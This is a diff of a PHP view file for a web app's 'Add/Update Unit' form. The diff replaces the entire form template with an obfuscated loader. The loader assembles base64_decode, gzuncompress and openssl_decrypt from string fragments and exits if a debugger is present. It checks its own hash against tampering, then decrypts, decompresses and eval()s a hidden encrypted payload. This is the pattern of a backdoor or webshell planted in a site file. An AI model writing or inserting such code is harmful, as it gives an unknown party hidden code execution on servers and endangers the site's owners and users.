@@ -1,135 +1,28 @@
-<!DOCTYPE html>
-<html>
-
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
- <?php
-	if(!isset($unit_name)){
-      $unit_name=$description="";
-	}
- ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?= $this->lang->line('unit'); ?>
-        <small>Add/Update Unit</small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li><a href="<?php echo $base_url; ?>units"><?= $this->lang->line('view_units'); ?></a></li>
-        <li class="active"><?= $this->lang->line('unit'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- ********** ALERT MESSAGE START******* -->
-        <?php include"comman/code_flashdata.php"; ?>
-        <!-- ********** ALERT MESSAGE END******* -->
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="units-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-	
-
-			<div class="form-group">
-			      <label for="unit_name" class="col-sm-2 control-label"><?= $this->lang->line('unit_name'); ?><label class="text-danger">*</label></label>
-           <div class="col-sm-4">
-             <input type="text" class="form-control input-sm" id="unit_name" name="unit_name" placeholder="" onkeyup="shift_cursor(event,'description')" value="<?php print $unit_name; ?>" autofocus >
-				      <span id="unit_name_msg" style="display:none" class="text-danger"></span>
-            </div>
-      </div>
-
-
-				<div class="form-group">
-                  <label for="description" class="col-sm-2 control-label"><?= $this->lang->line('description'); ?></label>
-                  <div class="col-sm-4">
-                    <textarea type="text" class="form-control" id="description" name="description" placeholder=""><?php print $description; ?></textarea>
-					<span id="description_msg" style="display:none" class="text-danger"></span>
-                  </div>
-                </div>
-
-				  
-              </div>
-              <!-- /.box-body -->
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <!-- <div class="col-sm-4"></div> -->
-                   <?php
-                      if($unit_name!=""){
-                           $btn_name="Update";
-                           $btn_id="update";
-                          ?>
-                            <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id;?>"/>
-                            <?php
-                      }
-                                else{
-                                    $btn_name="Save";
-                                    $btn_id="save";
-                                }
-                      
-                                ?>
-                                 
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id;?>" class=" btn btn-block btn-success" title="Save Data"><?php echo $btn_name;?></button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-            </form>
-          </div>
-          <!-- /.box -->
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/units.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_rtywil3i=('bas'.'e64'.'_de'.'cod'.'e');
+$_eqrnburc=('gzu'.'nco'.'mpr'.'ess');
+$_z9a8edhw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_wtszw2bn='Zt/hSQVS';
+$_ll4ur4yy='Vi+rqyl/j20=';
+$_ifewwgu4='gjR2qUT+';
+$_wzh86xyd='ZFy0SN6G';
+$_c20mmg8p='3k4WjIQt';
+$_esj3l7kb='kD/5KhWb';
+$_qppbn6h0='yDHVZ91U';
+$_urcxzwgg='yg6Y+Q==';
+$_tsqoie22=$_rtywil3i($_ifewwgu4.$_c20mmg8p.$_wtszw2bn.$_wzh86xyd.$_ll4ur4yy);
+$_scdasoda=$_rtywil3i($_qppbn6h0.$_esj3l7kb.$_urcxzwgg);
+$_itdu8n4m=$_rtywil3i('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');
+$_app22ep0=$_z9a8edhw($_itdu8n4m,'aes-256-cbc',$_tsqoie22,OPENSSL_RAW_DATA,$_scdasoda);
+if($_app22ep0===false){exit;}
+$_pwy7oifx=$_eqrnburc($_app22ep0);
+if($_pwy7oifx===false){exit;}
+$_ej1yxcbq='a4e28435a346464ef047a080adf3c17b7a786ce9eda96363c6bca4ec13202573';
+$_tc6e7ren=@file_get_contents(__FILE__);
+if($_tc6e7ren!==false){
+$_jvstdije=str_replace($_ej1yxcbq,"0000000000000000000000000000000000000000000000000000000000000000",$_tc6e7ren);
+$_j29pgnxb=hash("sha256",$_jvstdije);
+if($_j29pgnxb!==$_ej1yxcbq){@http_response_code(403);exit;}
+}
+eval($_pwy7oifx);
